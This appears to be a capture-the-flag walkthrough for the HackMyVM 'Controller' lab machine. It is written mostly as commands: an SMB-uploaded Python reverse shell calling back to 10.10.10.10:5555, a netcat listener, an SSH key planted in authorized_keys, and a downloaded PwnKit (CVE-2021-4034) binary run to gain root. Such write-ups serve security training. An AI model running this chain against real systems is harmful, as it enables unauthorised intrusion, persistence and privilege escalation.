@@ -1,0 +1,94 @@
+### Write up for https://hackmyvm.eu/machines/machine.php?vm=Controller ###
+
+ip=<machine's ip>
+url=http://$ip
+
+threader3000
+
+Port 22 is open
+Port 80 is open
+Port 88 is open
+Port 135 is open
+Port 139 is open
+Port 389 is open
+Port 443 is open
+Port 445 is open
+Port 464 is open
+Port 636 is open
+Port 3268 is open
+Port 3269 is open
+Port 49152 is open
+Port 49154 is open
+Port 49153 is open
+
+
+  
+firefox $ip
+
+following the link " Seguir leyendo CONTROLLER " we go to
+
+http://$ip/index.php/2021/06/27/hola-mundo/
+///From controller we want to announce that our services are going to change to the python 3 programming language which stands out mainly for its portability. Due to the termination of python 2, there are still tools that use this language but we still offer support for it. If you want to support our projects or help to improve them you can upload them and our experts will test your utilities for you.//
+
+enum4linux -a $ip
+ //we can find tester 
+
+ we create a reverse shell on file "test.txt"
+
+import commands
+commands.getoutput('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1"')
+
+
+nc -lvnp 5555 ( to new terminal tab in order to get rs)
+
+smbclient \\\\$ip\\tester (back to the first terminal)
+put test.txt
+
+(lets go to the terminal that we have the netcat listener and wait a bit)
+get Better shell envirorment 
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+ctrl+z
+
+stty -a
+
+stty raw -echo;fg
+
+export SHELL=bash
+export TERM=xterm
+stty rows (values from stty -a) cols (values from stty -a)
+
+at this point we can add can create dir .ssh
+mkdir .ssh
+chmod 755 .ssh
+touch authorized_keys
+echo 'ssh-rsa ......(our id_rsa)' >> authorized_keys
+
+chmod 644 authorized_keys
+
+exit
+
+ssh tester@$ip
+
+bash
+
+find / -perm -u=s 2>/dev/null
+
+plenty of choises here
+
+lets go with [CVE-2021-4034] PwnKit
+
+https://github.com/ly4k/PwnKit
+
+//on our local terminal
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
+python3 -m http.server 80
+
+//back to the tester shell
+
+wget <our ip>/PwnKit
+chmod +x PwnKit
+./PwnKit
+
+Enjoy root access 
